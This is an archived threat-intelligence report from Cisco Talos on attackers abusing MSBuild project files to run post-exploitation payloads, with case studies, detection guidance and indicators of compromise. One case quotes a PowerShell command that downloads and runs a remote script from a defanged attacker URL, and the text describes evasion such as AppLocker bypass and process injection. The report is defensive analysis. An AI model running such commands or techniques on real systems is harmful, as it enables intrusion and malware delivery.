{
    "id": "0ea09412-9a1e-41da-bca3-49ce87ee1222",
    "created_at": "2023-01-12T15:06:41.028873Z",
    "updated_at": "2025-03-27T02:05:46.989186Z",
    "deleted_at": null,
    "sha1_hash": "a2d1f2f15928aad1e49f00a4e2a037a1a87d78e1",
    "title": "2020-02-18 - Building a bypass with MSBuild",
    "authors": "",
    "file_creation_date": "2022-05-28T21:39:36Z",
    "file_modification_date": "2022-05-28T21:39:36Z",
    "file_size": 1934363,
    "plain_text": "# Building a bypass with MSBuild\n\n**[blog.talosintelligence.com/2020/02/building-bypass-with-msbuild.html](https://blog.talosintelligence.com/2020/02/building-bypass-with-msbuild.html)**\n\n_By_ _[Vanja Svajcer.](https://twitter.com/vanjasvajcer)_\n\n## NEWS SUMMARY\n\n\n-----\n\nLiving-off-the-land binaries (LoLBins) continue to pose a risk to security defenders.\nWe analyze the usage of the Microsoft Build Engine by attackers and red team\npersonnel.\n[These threats demonstrate techniques T1127 (Trusted Developer Utilities) and T1500](https://attack.mitre.org/techniques/T1127/)\n(Compile After Delivery) of MITRE ATT&CK framework.\n\nIn one of our [previous posts, we discussed the usage of default operating system](https://blog.talosintelligence.com/2019/11/hunting-for-lolbins.html)\nfunctionality and other legitimate executables to execute the so-called \"living-off-the-land\"\napproach to the post-compromise phase of an attack. We called those binaries LoLBins.\nSince then, Cisco Talos has analyzed telemetry we received from Cisco products and\nattempted to measure the usage of LoLBins in real-world attacks.\n\n[Specifically, we are going to focus on MSBuild as a platform for post-exploitation activities.](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view%3Dvs-2019)\nFor that, we are collecting information from open and closed data repositories as well as the\n[behavior of samples submitted for analysis to the Cisco Threat Grid platform.](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\n\n**What's new?**\n\nWe collected malicious MSBuild project configuration files and documented their structure,\nobserved infection vectors and final payloads. We also discuss potential actors behind the\ndiscovered threats.\n\n**How did it work?**\n\nMSBuild is part of the Microsoft Build Engine, a software build system that builds applications\n[as specified in its XML input file. The input file is usually created with Microsoft Visual Studio.](https://visualstudio.microsoft.com/)\nHowever, Visual Studio is not required when building applications, as some .NET framework\nand other compilers that are required for compilation are already present on the system.\n\nThe attackers take advantage of MSBuild characteristics that allow them to include malicious\nsource code within the MSBuild configuration or project file.\n\n**So What?**\n\nAttackers see a few benefits when using the MSBuild engine to include malware in a source\ncode format. This technique was discovered a few years ago and is well-documented by\n[Casey Smith, whose proof of concept template is often used in the samples we collected.](https://twitter.com/subTee)\n\nFirst of all, this technique can be used to bypass application whitelisting technologies\nsuch as [Windows Applocker.](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)\n\n\n-----\n\nAnother benefit is that the code is compiled in memory so that no permanent files exist\non the disk, which would otherwise raise a level of suspicion by the defenders.\n\nFinally, the attackers can employ various methods to obfuscate the payload, such as\nrandomizing variable names or encrypting the payload with a key hosted on a remote\nsite, which makes detection using traditional methods more challenging.\n\n## Technical case overview\n\nOne of the characteristics of MSBuild input configuration files is that the developer can\n[include a special XML tag that specifies an inline task, containing source code that will be](https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-inline-tasks?view%3Dvs-2019)\ncompiled and loaded by MSBuild in memory.\n\n_Definition of inline task within the MSBuild configuration file._\n\nDepending on the attributes of the task, the developer can specify a new class, a method or\na code fragment that automatically gets executed when a project is built.\n\nThe source code can be specified as an external file on a drive. Decoupling the project file\nand the malicious source code may make the detection of malicious MSBuild executions\neven more challenging.\n\nDuring the course of our research, we collected over 100 potentially malicious MSBuild\nconfiguration files from various sources, we analyzed delivery methods and investigated final\npayloads, usually delivered as a position-independent code, better known as shellcode.\n\n**Summary analysis of shellcode**\n\nMetasploit\n\nThe majority of the collected samples contained a variant of Metasploit Meterpreter stager\nshellcode, generated by the msfvenom utility in a format suitable for embedding in a C#\nvariable. The shellcode is often obfuscated by compressing the byte array with either zlib or\nGZip and then converting it into base64-encoded printable text.\n\n\n-----\n\n_Meterpreter stager shellcode example in an MSBuild configuration file._\n\n[Possibly the most convenient tool for quick shellcode analysis is shellcode debugger: scdbg.](http://sandsprite.com/blogs/index.php?uid%3D7%26pid%3D152)\nScdbg has many options to debug shellcode. Scdbg is based on an open-source x86\nemulation library libemu, so it only emulates the Windows environment and will not correctly\nanalyze every shellcode. Nevertheless, the tool is an excellent first stop for analyzing a\nlarger number of shellcode samples as it can produce log files that can later be used in\nclustering.\n\nOf course, to analyze shellcode, we need to convert it from the format suitable for\nassignment to a C# byte array variable back into the binary format. If you regularly use a\nUnix-based computer with an appropriate terminal/shell, your first port of call may be a\ndefault utility xxd, which is more commonly used to dump the content of a binary file in a\nhuman-readable hexadecimal format.\n\nHowever, xxd also has a reverting mode and it can be used to convert the C# array bytes\nback into the binary file, using command-line options -r and -p together.\n```\nxxd -r -p input_text_shellcode_file output_binary_shellcode_file\n\n```\nXxd supports several popular dumping formats, but it won't always produce the correct\noutput. It is important to check that the binary bytes and the bytes specified in the shellcode\ntext file are the same.\n\n\n-----\n\n_Scdgb API trace of a Metasploit stager shellcode._\n\nThere is a compiled version of scdbg available, but it is probably better to compile it from the\n[source code because of the new API emulations.](https://github.com/dzzie/VS_LIBEMU)\n\nCovenant\n\n[Covenant is a relatively new C#-based command and control framework that also allows an](https://github.com/cobbr/Covenant)\nattacker (or a red team member) to create payloads based on several infection vectors,\nincluding MSBuild. The skeleton code for the MSBuild loader is relatively simple and it takes\na binary payload, deflates it using zlib decompression and loads it in the MSBuild process\nspace.\n\nThe payload needs to be a .NET assembly which can be loaded and executed by the\nskeleton code. The Covenant framework has its own post-exploitation set of implants called\nGrunts. Grunts provide infrastructure for building communications with C2 servers. The tasks\nare sent to the infected system in a format of obfuscated C# assemblies which get loaded\nand executed by Grunts.\n\n_Covenant skeleton code loading a Grunt implant._\n\n\n-----\n\nNPS not Powershell in MSBuild\n\nNPS is a simple wrapper executable utility created to load the\nSystem.Management.Automation and few other .NET assemblies into the process space of\nan executable. The idea behind it is an attempt to evade the detection of the execution of\npowershell.exe and still run custom PowerShell code.\n\n[This idea is used by the developers of nps_payload tool which allows actors to create not-](https://github.com/trustedsec/nps_payload)\nPowerShell payloads using different mechanisms, including the MSBuild configuration tool.\nThe tool generates MSBuild project files with a choice of Meterpreter stagers shellcode\npayloads or a custom Powershell code payload supplied by the user.\n\n_MSBuild non-PowerShell flow._\n\nCobalt strike\n\nAlthough a Metasploit shellcode MSBuild payload is by far the most common, we have also\n[seen several samples that use a Cobalt Strike beacon as a payload. The beacon shellcode](https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html)\nhas a structure similar to a PE file but it is designed to be manually loaded in memory and\nexecuted by invoking the shellcode loader that starts at the beginning of the blob,\nimmediately before MZ magic bytes.\n\n_Cobalt Strike payload beginning._\n\n\n-----\n\n_Cobalt Strike reflective loader._\n\nThe payload itself is over 200 KB long, so it is relatively easy to recognize. One of the case\nstudies later in this post covers a more serious attempt to obfuscate the beacon payload by\nencrypting it with AES256 using a key hosted on a remote website.\nMimikatz\n\nThe only discovered payload that is longer than a Cobalt Strike shellcode/beacon is a\nsample containing two Mimikatz payloads. A sample we discovered has a more complex\nlogic for loading the executable into memory and eventually launching it with a call to\nCreateThread. The PE loader's source is available on GitHub, although for this sample, it\nwas somewhat adopted to work within MSBuild.\n\n_MSBuild Mimikatz loader_\n\nThe loader first checks if the operating system is 32 or 64 bit and then loads and runs the\nappropriate Mimikatz executable stored in a variable encoded using base64.\n\n\n-----\n\n**Case studies**\n\nWe follow our general observations with three case studies discovered by searching the\nsubmissions in the Cisco Threat Grid platform over the period of the last 6 months. Samples\nattempting to abuse MSBuild are detected by Threat Grid using the indicator \"MSBuild\nProcess Builds with Project File (xml/csproj)\". This indicator name can also be used to\nsearch for additional samples attempting to use the same technique.\n\n_Brief Cisco Threat Grid explanation of the MSBuild-related indicator of compromise._\n\n**Case 1: Word document to MSBuild payload on Dropbox**\n\nOur first case study of an actual campaign using MSBuild to deploy a payload is a Word\ndocument that displays a fairly common fake message prompting the user to \"enable\ncontent\" to execute a VBA macro code included in the document.\n\nOnce enabled, the VBA code creates two files in the user's Temp folder. The first one is\ncalled \"expenses.xlsx\" and it is actually an MSBuild configuration XML file containing\nmalicious code to compile and launch a payload.\n\nAccording to VirusTotal, the sample was hosted on a publicly accessible Dropbox folder with\nthe file name \"Candidate Resume - Morgan Stanley 202019.doc,\" which indicates that the\ncampaign was targeted or that the actor is conducting a red team exercise to attempt to\nsneak by a company's defenses.\n\n\n-----\n\n_Sample when opened._\n\nThe second file created by the VBA code in the user's temporary folder is called\n\"resume.doc.\" This is a clean decoy Word document that displays a simple resume for the\nposition of a marketing manager.\n\n\n-----\n\n_The decoy clean document._\n\nWinword launches MSBuild, which starts the C# compilers csc.exe and cvtres.exe.\n\n_Threat Grid process tree execution of the sample._\n\nWe can also see the MSBuild process launching Internet Explorer (iexplore.exe).\niexplore.exe is launched in a suspended mode so that the payload, which is a Cobalt strike\n\n\n-----\n\nbeacon, can be copied into its process space and launched by queuing the thread as an\nasynchronous procedure call, one of the common techniques of process injection.\n\nBlue teams should regularly investigate parent-child relationships between processes. In this\ncase, seeing winword.exe launching the MSBuild.exe process and MSBuild.exe launching\niexplore.exe is highly unusual.\n\n_MSBuild-based process injection source code._\n\n**Case 2: Excel file to Silent Trinity**\n\nThe second case study has a similar pattern to the previous one. Here, we have an Excel file\nthat looks like it contains confidential salary information but prompts the user to enable\nediting to see the content.\n\n\n-----\n\n_Excel sample when opened_\n\nThe Excel file contains a VBA macro code that does not look very suspicious at first glance\nbut actually calls to another function. This function also starts out rather innocuously, but\neventually ends with a suspicious call to Wscript.Shell using a document Subject attribute\ncontaining a URL of the next loader stage.\n\n_VBA Code using the Subject attribute of the document to launch the next stage._\n\nThe document subject property contains the code to execute PowerShell and fetch and\ninvoke the next stage:\n```\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -w hidden -Command\niex(New-Object\nSystem.Net.WebClient).DownloadString('hxxp://apb[.]sh/helloworld[.]ps1')\n\n```\nHelloworld.ps1 downloads the MSBuild configuration from another URL,\nhxxp://apb[.]sh/msbuild[.]xml and launches it. Finally, Helloworld.ps1 downloads a file from\nhxxp://apb[.]sh/per[.]txt and saves it as a.bat in the user's \\Start Menu\\Programs\\Startup\\\nfolder. A.bat ensures that the payload persists after users logs-out of the system.\n\n[The downloaded MSBuild configuration file seems to be generated by the Silent Trinity .NET](https://github.com/byt3bl33d3r/SILENTTRINITY)\npost-exploitation framework. It stores a .NET assembly payload as a file compressed with\nzlib and then encoded using a base64 encoder. Once decoded, the Silent Trinity stager\nassembly is loaded with the command and control URL pointing to hxxp://35[.]157[.]14[.]111,\nand TCP port 8080, an IP address belonging to Amazon AWS range.\n\n_All stages of the Silent Trinity case study._\n\n\n-----\n\nSilent Trinity is a relatively recent framework that enables actors and members of red teams\nto conduct various activities after the initial foothold is established. An original Silent Trinity\n[implant is called Naga and has an ability to interpret commands sent in the Boolang](https://github.com/boo-lang/boo)\nlanguage. The communication between the implant and the C2 server is encrypted even if\nthe data is sent over HTTP.\n\nIn this case, the actors are using an older version of Naga, which does not use Boolang, but\nit attempts to load IronPython, implementation of Python for .NET framework.\n\n_Silent Trinity implant loading IronPython engine._\n\nLike with any post-exploitation framework, it is difficult to make a decision if this campaign is\ntruly malicious or it was conducted by a red team member.\n\n**Case 3: URL to encrypted Cobalt Strike beacon**\n\nOur final case study has a different infection chain. It starts with a web page hosting an\nalleged code of conduct document for employees of a known apparel manufacturer G-III.\nThe document is an HTML application written in VB Script that creates an MSBuild\nconfiguration file and runs MSBuild.\n\n_VB Script HTA file creating a configuration file and invoking MSBuild._\n\n\n-----\n\nThe MSBuild configuration file contains an inline task class that uses an external URL to\nretrieve the key to decrypt the encrypted embedded payload. The key was stored in the URL\nhxxp://makeonlineform[.]com/forms/228929[.]txt. The embedded payload is a Cobalt Strike\nPowershell loader which deobfuscates the final Cobalt Strike beacon and loads it into the\nprocess memory.\n\n_Deobfuscated Cobalt Strike PowerShell loader._\n\nOnce the Cobalt Strike beacon is loaded, the HTA application navigates the browser to the\nactual URL of the G-III code of conduct. Finally, the generated MSBuild configuration file is\nremoved from the computer.\n\nIf we look at the process tree in the graph generated by Threat Grid, we see that a potentially\nsuspicious event of MSBuild.exe process launching PowerShell. Mshta.exe does not show\nup as a parent process of MSBuild.exe, otherwise, this graph would be even more\nsuspicious.\n\n_HTA application process tree as seen in Threat Grid._\n\n**Telemetry and MSBuild, possible actors**\n\nLooking at the MSBuild telemetry in a format of process arguments defenders can take from\n\n\n-----\n\ntheir systems or from their EDR tools such as [Cisco AMP for Endpoints it is not easy to](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\ndecide if an invocation of MSBuild.exe in their environments is suspicious.\n\nThis stands in contrast with invocations of PowerShell with encoded scripts where the actual\ncode can be investigated by looking at command line arguments.\n\nWe have measured a proportion of systems running AMP for Endpoints using MSBuild over\na period of 30 days to get help us decide if any MSBuild event needs to be investigated.\n\n_The proportion of endpoints running MSBuild on a daily basis in January 2020._\n\nWe also looked at the project filenames. This can catch attacks using default project file\nnames but we cannot expect to catch all using this technique as filenames can be arbitrary.\nAnother possible criterion for investigations is the number of arguments used when MSBuild\nis invoked where invocations with only a single argument, where the argument is a project\nname, could be considered more suspicious.\n\nIn addition to the number of arguments, the defenders should look at the file path from where\nMSBuild is running. It is very likely that suspicious MSBuild invocations will be a subset to\nthe invocation of the path\nC:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll, which is\ngenerally specified as the build assembly in malicious MSBuild configuration files.\n\nThe final approach within an organization could be to baseline the parent processes of\nMSBuild within the organization and mark as suspicious any invocations that do not come\nfrom the usual processes, such as the Visual Studio development environment and other\nsoftware building frameworks. When investigating our telemetry through January 2020, we\n\n\n-----\n\nfound only 65 unique executables that acted as parent processes on all endpoints protected\nby AMP for Endpoints. In almost every organization, this number should be lower and easy\nto manage.\n\nIn all the endpoints sending telemetry to Cisco, there are up to 2 percent of them running\nMSBuild on a daily basis, which is too much to investigate in any larger organization.\nHowever, if we apply the rules for what constitutes a suspicious MSBuild invocation as\ndescribed above, we come to a much more manageable number of about one in fifty\nthousand endpoints (0.1 percent of 2 percent).\n\n_The proportion of endpoints with suspect MSBuild calls in Cisco AMP for Endpoints._\n\nWhen considering the authors behind discovered samples, it is very difficult to say more\nwithout additional context. Certainly, having only MSBuild project files allows us to conduct\nbasic analysis of the source code and their payloads. Only with some behavioral results,\nsuch as the ones from Threat Grid, do we begin to see more context and build a clearer\npicture of how MSBuild is abused.\n\nIn our investigation, most of the payloads used some sort of a post-exploitation agent, such\nas Meterpreter, Cobalt Strike, Silent Trinity or Covenant. From those, we can either conclude\nthat the actors are interested in gaining a foothold in a company to conduct further malicious\nactivities or that actors are red team members conducting a penetration test to estimate the\nquality of detection and the function of the target's defending team.\n\n## Conclusion\n\n\n-----\n\nMSBuild is an essential tool for software engineers building .NET software projects.\nHowever, the ability to include code in MSBuild project files allows malicious actors to abuse\nit and potentially provide a way to bypass some of the Windows security mechanisms.\n\nFinally, our research shows that MSBuild is generally not used by commodity malware. Most\nof the observed cases had a variant of a post-exploitation agent as a final payload. The\nusage of widely available post-exploitation agents in penetration testing is somewhat\nquestionable as the defenders can be lulled into a false sense of security. If the defenders\nget used to seeing, for example, Meterpreter, if another Meterpreter agent is detected on\ntheir network they may be ignored, even if it is deployed by a real malicious actor.\n\nDefenders are advised to carefully monitor command-line arguments of process execution\nand specifically investigate instances where MSBuild parent process is a web browser or a\nMicrosoft Office executable. This kind of behavior is highly suspicious that indicates that\ndefenses have been breached. Once a baseline is set, the suspect MSBuild calls should be\neasily visible and relatively rare so they do not increase the average team workload.\n\nIn a production environment, where there are no software developers, every execution of\nMSBuild.exe should be investigated to make sure the usage is legitimate.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the](https://www.cisco.com/c/en/us/products/security/advanced-malware-protection)\nmalware used by these threat actors. Exploit Prevention present within AMP is designed to\nprotect customers from unknown attacks such as this automatically.\n\n\n-----\n\n[Cisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents](https://www.cisco.com/c/en/us/products/security/cloud-web-security/index.html)\naccess to malicious websites and detects malware used in these attacks.\n\n[Email Security can block malicious emails sent by threat actors as part of their campaign.](https://www.cisco.com/c/en/us/products/security/email-security-appliance/index.html)\n\n[Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\n[Intrusion Prevention System (NGIPS),Cisco ISR, andMeraki MX can detect malicious activity](https://www.cisco.com/c/en/us/products/security/intrusion-prevention-system-ips/index.html)\nassociated with this threat.\n\n[AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security](https://www.cisco.com/c/en/us/solutions/enterprise-networks/amp-threat-grid/index.html)\nproducts.\n\n[Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs, and URLs, whether users are on or off the corporate network.\n\nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase onSnort.org.](https://www.snort.org/products)\n\n## IOCs\n\nSHA256s\n\n334d4bcdbd645589b3cf37895c79b3b04047020540d7464268b3be4007ad7ab1 - Cobalt\nStrike MSBuild project\n\na4eebe193e726bb8cc2ffbdf345ffde09ab61d69a131aff6dc857b0d01dd3213 - Cobalt Strike\npayload\n\n6c9140003e30137b0780d76da8c2e7856ddb4606d7083936598d5be63d4c4c0d - Covenant\nMSBuild project\n\nee34c2fccc7e605487ff8bee2a404bc9fc17b66d4349ea3f93273ef9c5d20d94 - Covenant\npayload\n\naaf43ef0765a5380036c5b337cf21d641b5836ca87b98ad0e5fb4d569977e818 - Mimikatz\nMSBuild project\n\nef7cc405b55f8a86469e6ae32aa59f693e1d243f1207a07912cce299b66ade38 - Mimikatz x86\npayload\n\nabb93130ad3bb829c59b720dd25c05daccbaeac1f1a8f2548457624acae5ba44 - Metasploit\nShellcode MSBuild project\n\nce6c00e688f9fb4a0c7568546bfd29552a68675a0f18a3d0e11768cd6e3743fd - Meterpreter\nstager shellcode\n\na661f4fa36fbe341e4ec0b762cd0043247e04120208d6902aad51ea9ae92519e - Not\nPowershell MSBuild project\n\n18663fccb742c594f30706078c5c1c27351c44df0c7481486aaa9869d7fa95f8 - Word to\nCobalt Strike\n\n35dd34457a2d8c9f60c40217dac91bea0d38e2d0d9a44f59d73fb82197aaa792 - Excel to\nSilent Trinity\n\n\n-----\n\nURLs\n\nhxxp://apb[.]sh/helloworld[.]ps1\nhxxp://apb[.]sh/msbuild[.]xml\nhxxp://apb[.]sh/per[.]txt\nhxxp://makeonlineform[.]com/f/c3ad6a62-6a0e-4582-ba5e-9ea973c85540/ - HTA to Cobalt\nStrike URL\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-02-18 - Building a bypass with MSBuild.pdf"
    ],
    "report_names": [
        "2020-02-18 - Building a bypass with MSBuild.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536001,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653773976,
    "ts_modification_date": 1653773976,
    "files": {
        "pdf": "https://archive.orkl.eu/a2d1f2f15928aad1e49f00a4e2a037a1a87d78e1.pdf",
        "text": "https://archive.orkl.eu/a2d1f2f15928aad1e49f00a4e2a037a1a87d78e1.txt",
        "img": "https://archive.orkl.eu/a2d1f2f15928aad1e49f00a4e2a037a1a87d78e1.jpg"
    }
}